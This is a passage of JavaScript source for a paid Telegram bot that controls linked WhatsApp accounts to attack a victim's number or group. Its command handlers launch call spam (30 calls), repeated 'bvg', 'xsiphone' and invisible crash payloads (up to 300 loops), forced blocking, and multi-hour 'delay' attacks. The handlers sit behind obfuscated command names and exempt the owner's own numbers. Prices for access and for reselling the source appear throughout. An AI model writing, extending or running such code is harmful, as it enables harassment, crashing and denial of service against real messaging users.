  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /callspam: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  // Block specific numbers
  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ This number is blocked from being targeted.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  // Verify if the target number is registered on WhatsApp
  const userSock = sessions.get(userNumber);
  try {
    const contactInfo = await userSock.onWhatsApp(formattedNumber);
    if (contactInfo.length === 0) {
      return userBot.sendMessage(chatId, '❌ The number is not registered on WhatsApp.');
    }
  } catch (error) {
    console.error(`Error checking WhatsApp registration for ${numberTarget}: ${error.message}`);
    return userBot.sendMessage(chatId, `❌ Error verifying number: ${error.message}`);
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent call spam...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await userBot.sendMessage(chatId, `✅ Successfully started call spam to @${numberTarget} using /callspam. Pause for 2 minutes to avoid bans.`, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[{ text: 'Contact Support', url: 'https://t.me/dgxeon13' }]],
      },
    });

    await sleep(1000);

    // Send 30 call offers with a 2-second delay between each
    for (let i = 0; i < 30; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      const success = await sendOfferCall(userSock, formattedNumber);
      if (!success) {
        await userBot.sendMessage(chatId, `❌ Failed to send call offer ${i + 1}/30 to ${numberTarget}.`);
        break;
      }
      await sleep(2000); // 2-second delay
    }
  } catch (error) {
    console.error(`Error in /callspam for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /callspam: ${error.message}`);
  }
});

botInstance.onText(/\/sheoeije(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /forcexgroup raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /forcexgroup input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /forcexgroup: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and optional loop count, separated by a pipe (|).\nExample: /forcegroup 120363047626537123@g.us|5\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const args = match[1].trim().split('|');
  const rawTarget = args[0].trim().replace(/\s/g, ''); // Remove any hidden whitespace
  let loopCount = parseInt(args[1]) || 5; // Default to 5 if not provided or invalid

  console.log(`[DEBUG] /forcexgroup: rawTarget = "${rawTarget}", length = ${rawTarget.split('@')[0].length}, loopCount = ${loopCount}`);

  // Check if input is a WhatsApp group link
  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /forcexgroup: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537123@g.us). Use /group-id <link> to get the group ID.');
  }

  // Validate group JID format
  if (!/^\d{10,20}@g\.us$/.test(rawTarget)) {
    console.log(`[DEBUG] /forcexgroup: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must be a valid WhatsApp group ID (e.g., 120363047626537123@g.us).');
  }

  // Validate loop count
  if (isNaN(loopCount) || loopCount < 1) {
    loopCount = 5; // Default to 5 if invalid
    console.log(`[DEBUG] /forcexgroup: Invalid loop count, defaulting to ${loopCount}`);
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent force messages to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Loops: ${loopCount}
└────────────────────────┘`
    });

    await forcexgroup(rawTarget, userNumber, chatId, botInstance, loopCount);
  } catch (error) {
    console.error(`Error in /forcexgroup for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /forcexgroup: ${error.message}`);
  }
});

// Command handler for /forceblock
botInstance.onText(/\/eu82i2(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /forceblock raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /forceblock input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /forceblock: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and optional loop count, separated by a pipe (|).\nExample: /forceblock +919876543210|5');
  }

  const args = match[1].trim().split('|');
  const rawTarget = args[0].trim().replace(/\s/g, ''); // Remove any hidden whitespace
  let loopCount = parseInt(args[1]) || 5; // Default to 5 if not provided or invalid

  console.log(`[DEBUG] /forceblock: rawTarget = "${rawTarget}", loopCount = ${loopCount}`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /forceblock: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /forceblock: numberTarget = "${numberTarget}", loopCount = ${loopCount}`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /forceblock: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316008', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent forceblock...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Loops: ${loopCount}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    await forceblock(formattedNumber, userNumber, chatId, botInstance, loopCount);
  } catch (error) {
    console.error(`Error in /forceblock for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /forceblock: ${error.message}`);
  }
});

// Register the /wui command
botInstance.onText(/\/wuixxd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /wui raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /wui input: match[2] = "${match[2]}"`);

  let targetJid;
  if (msg.mentionedJid && msg.mentionedJid.length > 0) {
    targetJid = msg.mentionedJid[0]; // Use mentioned JID if available
    console.log(`[DEBUG] /wui: Using mentioned JID = "${targetJid}"`);
  } else if (msg.quoted && msg.quoted.sender) {
    targetJid = msg.quoted.sender; // Use quoted message sender if available
    console.log(`[DEBUG] /wui: Using quoted sender JID = "${targetJid}"`);
  } else if (match[2] && match[2].trim() !== '') {
    const rawTarget = match[2].trim();
    console.log(`[DEBUG] /wui: rawTarget = "${rawTarget}"`);

    if (!isValidPhoneNumber(rawTarget)) {
      console.log(`[DEBUG] /wui: Invalid phone number format for "${rawTarget}"`);
      return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
    }

    const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
    console.log(`[DEBUG] /wui: numberTarget = "${numberTarget}"`);

    if (numberTarget.length < 8 || numberTarget.length > 15) {
      console.log(`[DEBUG] /wui: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
      return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
    }

    targetJid = `${numberTarget}@s.whatsapp.net`;
  } else {
    console.log(`[DEBUG] /wui: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number, mention a user, or reply to a message.\nExample: /wui +919876543210');
  }

  if (!targetJid.endsWith('@s.whatsapp.net') || targetJid.includes('@g.us')) {
    console.log(`[DEBUG] /wui: Invalid JID format for "${targetJid}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target. Only individual WhatsApp numbers are supported.');
  }

  const numberTarget = targetJid.split('@')[0];
  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to 👇🏻
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await wui(targetJid, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /wui for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /wui: ${error.message}`);
  }
});

// Telegram command handler

botInstance.onText(/\/fcbetaxxd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /fcbeta raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /fcbeta input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /fcbeta: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xbetakill +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /fcbeta: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /fcbeta: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /fcbeta: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /fcbeta: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to 👇🏻
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });
        for (let i = 0; i < 2; i++) {
        await sleep(1000);
          await xeonBetaPayment(formattedNumber, userNumber, chatId, botInstance);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /fcbeta for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /fcbeta: ${error.message}`);
  }
});

// Telegram command handler
botInstance.onText(/\/xxxxsiphonexxx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xsiphone raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xsiphone input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xsiphone: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xsiphone +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xsiphone: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xsiphone: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xsiphone: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xsiphone: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

for (let i = 0; i <300; i++) {
    await xsiphone(formattedNumber, userNumber, chatId, botInstance);
    await sleep(1000);
    }
  } catch (error) {
    console.error(`Error in /xsiphone for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xsiphone: ${error.message}`);
  }
});

// Telegram command handler
botInstance.onText(/\/fbeowinfel(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xdroidinvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xdroidinvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xeoninvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xdroidinvisible +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xdroidinvisible: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xdroidinvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xdroidinvisible: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xdroidinvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

for (let i = 0; i <5; i++) {
    await xeonAndroidInvisible(formattedNumber, userNumber, chatId, botInstance);
    }
  } catch (error) {
    console.error(`Error in /xdroidinvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xeoninvisible: ${error.message}`);
  }
});

// Register the /xjammer command
botInstance.onText(/\/(xddff|defdeeffss)(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayking raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /delayking input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delayking: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayking +919876543210 2\nExample: /stressking +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delayking: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayking +919876543210 2\nExample: /stressking +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delayking: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delayking: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delayking: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delayking: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      XeonDelay1(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /delayking for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayking or /stressking: ${error.message}`);
  }
});

botInstance.onText(/\/newdelay(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /newdelay raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /newdelay input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /newdelay: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /newdelay +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /newdelay: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /newdelay +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /newdelay: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /newdelay: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /newdelay: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /newdelay: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      XeonDelay1(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /newdelay for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /newdelay: ${error.message}`);
  }
});

botInstance.onText(/\/xxxssehse(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /visiblemax raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /visiblemax input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /visiblemax: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /visiblemax +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /visiblemax: Insufficient arguments provided`);
